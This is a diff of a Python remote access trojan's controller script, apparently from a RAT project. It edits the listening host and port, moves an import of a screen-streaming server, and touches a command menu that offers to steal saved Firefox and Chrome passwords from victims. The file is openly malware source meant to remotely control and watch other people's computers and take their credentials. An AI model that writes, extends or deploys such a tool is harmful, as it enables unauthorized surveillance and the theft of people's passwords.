@@ -1,11 +1,12 @@
 import random
 import socket, os
 import pickle
+from vidstream import StreamingServer
 
 class SERVER:
     def __init__(self, host, port):
-        self.host = "ip"
-        self.port = 4545
+        self.host = "127.0.0.1"
+        self.port = 4444
     
     def build_connection(self):
         global client, addr, s
@@ -21,7 +22,6 @@ class SERVER:
     
     def server(self):
         try:
-            from vidstream import StreamingServer
             global server
             server = StreamingServer(self.host, 8080)
             server.start_server()
@@ -137,7 +137,7 @@ readfile <file>           read from file
         print("Web Browser: ")
         print("======================================================")
         print(f'''
-get_passwords_firefox            =-get saved passwords in firefox
+get_passwords_firefox            get saved passwords in firefox
 get_passwords_chrome             get saved passwords in chrome
 ''')
         print("======================================================")
@@ -574,7 +574,6 @@ get_passwords_chrome             get saved passwords in chrome
 
             elif command == 'exit':
                 client.send(command.encode())
-                s.close
                 break
 
 rat = SERVER('127.0.0.1', 4444)
